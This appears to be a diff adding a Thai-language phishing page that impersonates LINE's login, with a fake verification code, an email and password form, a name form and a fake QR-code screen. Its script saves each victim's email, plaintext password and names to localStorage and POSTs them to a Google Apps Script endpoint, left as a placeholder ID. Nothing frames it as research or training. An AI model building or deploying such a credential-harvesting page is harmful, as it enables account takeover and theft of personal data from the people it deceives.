@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LINE - รหัสยืนยันตัวตน</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        .logo {
+            color: #22c55e;
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #6b7280;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .verification-code {
+            background: #f3f4f6;
+            border: 2px dashed #d1d5db;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            font-size: 32px;
+            font-weight: bold;
+            color: #1f2937;
+            letter-spacing: 8px;
+        }
+        
+        .timer {
+            color: #ef4444;
+            font-weight: 600;
+            margin: 20px 0;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #374151;
+            font-weight: 500;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #22c55e;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin: 10px 0;
+        }
+        
+        .btn-primary {
+            background: #22c55e;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #16a34a;
+        }
+        
+        .btn-secondary {
+            background: #f3f4f6;
+            color: #374151;
+        }
+        
+        .btn-secondary:hover {
+            background: #e5e7eb;
+        }
+        
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            background: #f3f4f6;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            margin: 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            color: #6b7280;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .email-suggestions {
+            background: white;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            margin-top: 5px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        
+        .email-suggestion {
+            padding: 12px 16px;
+            cursor: pointer;
+            border-bottom: 1px solid #f3f4f6;
+        }
+        
+        .email-suggestion:hover {
+            background: #f9fafb;
+        }
+        
+        .email-suggestion:last-child {
+            border-bottom: none;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                margin: 20px;
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- หน้ารหัสยืนยันตัวตน -->
+        <div id="verification-page">
+            <div class="logo">LINE</div>
+            <h1 class="title" id="verification-title">รหัสยืนยันตัวตน</h1>
+            <p class="subtitle" id="verification-subtitle">กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย</p>
+            
+            <div class="verification-code" id="verification-code">1234</div>
+            <div class="timer" id="timer">เหลือเวลา: 03:00</div>
+            
+            <button class="btn btn-primary" onclick="goToEmailPage()">เข้าสู่ระบบด้วยรหัสยืนยัน</button>
+        </div>
+        
+        <!-- หน้าล็อกอินด้วยอีเมล -->
+        <div id="email-page" class="hidden">
+            <div class="logo">LINE</div>
+            <h1 class="title" id="email-title">LINE</h1>
+            
+            <div class="form-group">
+                <label class="form-label" id="email-label">อีเมล</label>
+                <input type="email" class="form-input" id="email-input" placeholder="อีเมล" 
+                       onfocus="showEmailSuggestions()" onblur="hideEmailSuggestions()">
+                <div id="email-suggestions" class="email-suggestions hidden">
+                    <div class="email-suggestion" onclick="selectEmail('sareingsaehx@gmail.com')">sareingsaehx@gmail.com</div>
+                    <div class="email-suggestion" onclick="selectEmail('user@gmail.com')">user@gmail.com</div>
+                    <div class="email-suggestion" onclick="selectEmail('admin@line.com')">admin@line.com</div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label" id="password-label">รหัสผ่าน</label>
+                <input type="password" class="form-input" id="password-input" placeholder="รหัสผ่าน">
+            </div>
+            
+            <button class="btn btn-primary" onclick="goToFormPage()">เข้าสู่ระบบ</button>
+        </div>
+        
+        <!-- หน้าฟอร์มข้อมูล -->
+        <div id="form-page" class="hidden">
+            <div class="logo">LINE</div>
+            <h1 class="title">กรอกข้อมูล</h1>
+            <p class="subtitle">กรุณากรอกข้อมูลของคุณ</p>
+            
+            <div class="form-group">
+                <label class="form-label" id="firstname-label">ชื่อ</label>
+                <input type="text" class="form-input" id="firstname-input" placeholder="ชื่อ">
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label" id="lastname-label">นามสกุล</label>
+                <input type="text" class="form-input" id="lastname-input" placeholder="นามสกุล">
+            </div>
+            
+            <button class="btn btn-primary" onclick="goToQRPage()">ยืนยัน</button>
+        </div>
+        
+        <!-- หน้า QR Code -->
+        <div id="qr-page" class="hidden">
+            <div class="logo">LINE</div>
+            <h1 class="title" id="qr-title">เข้าสู่ระบบด้วยคิวอาร์โค้ด</h1>
+            <p class="subtitle" id="qr-subtitle">โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับมือถือใหม่ แล้วกดสแกนคิวอาร์โค้ด</p>
+            
+            <div class="qr-code">QR Code จะแสดงที่นี่</div>
+            
+            <button class="btn btn-secondary" onclick="goToEmailPage()">เข้าสู่ระบบด้วยอีเมลแทน</button>
+            <button class="btn btn-primary" onclick="window.open('https://help.line.me/line/android/categoryId/20000067/3/pc?lang=th', '_blank')">วิธีสแกนคิวอาร์โค้ด</button>
+        </div>
+    </div>
+
+    <script>
+        // ตัวแปรสำหรับเก็บการตั้งค่า
+        let config = {
+            texts: {
+                verificationTitle: 'รหัสยืนยันตัวตน',
+                verificationSubtitle: 'กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย',
+                emailTitle: 'LINE',
+                emailLabel: 'อีเมล',
+                passwordLabel: 'รหัสผ่าน',
+                loginButton: 'เข้าสู่ระบบ',
+                firstnameLabel: 'ชื่อ',
+                lastnameLabel: 'นามสกุล',
+                submitButton: 'ยืนยัน',
+                qrTitle: 'เข้าสู่ระบบด้วยคิวอาร์โค้ด',
+                qrSubtitle: 'โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับมือถือใหม่ แล้วกดสแกนคิวอาร์โค้ด',
+                backToEmail: 'เข้าสู่ระบบด้วยอีเมลแทน',
+                howToScan: 'วิธีสแกนคิวอาร์โค้ด'
+            },
+            colors: {
+                primary: '#22c55e',
+                secondary: '#3b82f6',
+                background: '#f8fafc'
+            },
+            pages: {
+                verification: true,
+                email: true,
+                form: true,
+                qr: true
+            }
+        };
+
+        // โหลดการตั้งค่าจาก localStorage
+        function loadConfig() {
+            try {
+                const saved = localStorage.getItem('lineFormConfig');
+                if (saved) {
+                    config = { ...config, ...JSON.parse(saved) };
+                    updateUI();
+                }
+            } catch (e) {
+                console.log('ไม่สามารถโหลดการตั้งค่าได้');
+            }
+        }
+
+        // อัปเดต UI ตามการตั้งค่า
+        function updateUI() {
+            // อัปเดตข้อความ
+            document.getElementById('verification-title').textContent = config.texts.verificationTitle;
+            document.getElementById('verification-subtitle').textContent = config.texts.verificationSubtitle;
+            document.getElementById('email-title').textContent = config.texts.emailTitle;
+            document.getElementById('email-label').textContent = config.texts.emailLabel;
+            document.getElementById('password-label').textContent = config.texts.passwordLabel;
+            document.getElementById('firstname-label').textContent = config.texts.firstnameLabel;
+            document.getElementById('lastname-label').textContent = config.texts.lastnameLabel;
+            document.getElementById('qr-title').textContent = config.texts.qrTitle;
+            document.getElementById('qr-subtitle').textContent = config.texts.qrSubtitle;
+
+            // อัปเดตสี
+            document.documentElement.style.setProperty('--primary-color', config.colors.primary);
+            document.documentElement.style.setProperty('--secondary-color', config.colors.secondary);
+            document.documentElement.style.setProperty('--background-color', config.colors.background);
+        }
+
+        // ฟังก์ชันสำหรับเปลี่ยนหน้า
+        function showPage(pageId) {
+            const pages = ['verification-page', 'email-page', 'form-page', 'qr-page'];
+            pages.forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(pageId).classList.remove('hidden');
+        }
+
+        function goToEmailPage() {
+            if (config.pages.email) {
+                showPage('email-page');
+            } else {
+                goToFormPage();
+            }
+        }
+
+        function goToFormPage() {
+            if (config.pages.form) {
+                showPage('form-page');
+            } else {
+                goToQRPage();
+            }
+        }
+
+        function goToQRPage() {
+            if (config.pages.qr) {
+                showPage('qr-page');
+                // บันทึกข้อมูลฟอร์ม
+                saveFormData();
+            } else {
+                showPage('verification-page');
+            }
+        }
+
+        // ฟังก์ชันสำหรับ email suggestions
+        function showEmailSuggestions() {
+            document.getElementById('email-suggestions').classList.remove('hidden');
+        }
+
+        function hideEmailSuggestions() {
+            setTimeout(() => {
+                document.getElementById('email-suggestions').classList.add('hidden');
+            }, 200);
+        }
+
+        function selectEmail(email) {
+            document.getElementById('email-input').value = email;
+            hideEmailSuggestions();
+        }
+
+        // บันทึกข้อมูลฟอร์ม
+        function saveFormData() {
+            const formData = {
+                email: document.getElementById('email-input').value,
+                password: document.getElementById('password-input').value,
+                firstName: document.getElementById('firstname-input').value,
+                lastName: document.getElementById('lastname-input').value,
+                timestamp: new Date().toISOString()
+            };
+
+            // บันทึกลง localStorage
+            let submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
+            submissions.push(formData);
+            localStorage.setItem('formSubmissions', JSON.stringify(submissions));
+
+            // ส่งไป Google Sheets (ถ้ามี)
+            sendToGoogleSheets(formData);
+        }
+
+        // ส่งข้อมูลไป Google Sheets
+        function sendToGoogleSheets(data) {
+            // URL ของ Google Apps Script
+            const scriptURL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+            
+            fetch(scriptURL, {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: {
+                    'Content-Type': 'application/json',
+                }
+            }).catch(error => {
+                console.log('ไม่สามารถส่งข้อมูลไป Google Sheets ได้:', error);
+            });
+        }
+
+        // สร้างรหัสยืนยัน
+        function generateVerificationCode() {
+            const code = Math.floor(1000 + Math.random() * 9000);
+            document.getElementById('verification-code').textContent = code;
+        }
+
+        // ตัวนับเวลาถอยหลัง
+        function startTimer() {
+            let timeLeft = 180; // 3 นาที
+            const timer = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                document.getElementById('timer').textContent = 
+                    `เหลือเวลา: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    generateVerificationCode();
+                    timeLeft = 180;
+                }
+                timeLeft--;
+            }, 1000);
+        }
+
+        // ฟังการเปลี่ยนแปลงจาก Admin Panel
+        function listenForConfigChanges() {
+            window.addEventListener('storage', (e) => {
+                if (e.key === 'lineFormConfig') {
+                    loadConfig();
+                }
+            });
+
+            // ตรวจสอบการเปลี่ยนแปลงทุก 1 วินาที
+            setInterval(loadConfig, 1000);
+        }
+
+        // เริ่มต้นเมื่อโหลดหน้า
+        window.onload = function() {
+            loadConfig();
+            generateVerificationCode();
+            startTimer();
+            listenForConfigChanges();
+            
+            // แสดงหน้าแรกตามการตั้งค่า
+            if (config.pages.verification) {
+                showPage('verification-page');
+            } else if (config.pages.email) {
+                showPage('email-page');
+            } else if (config.pages.form) {
+                showPage('form-page');
+            } else {
+                showPage('qr-page');
+            }
+        };
+    </script>
+</body>
+</html>
+
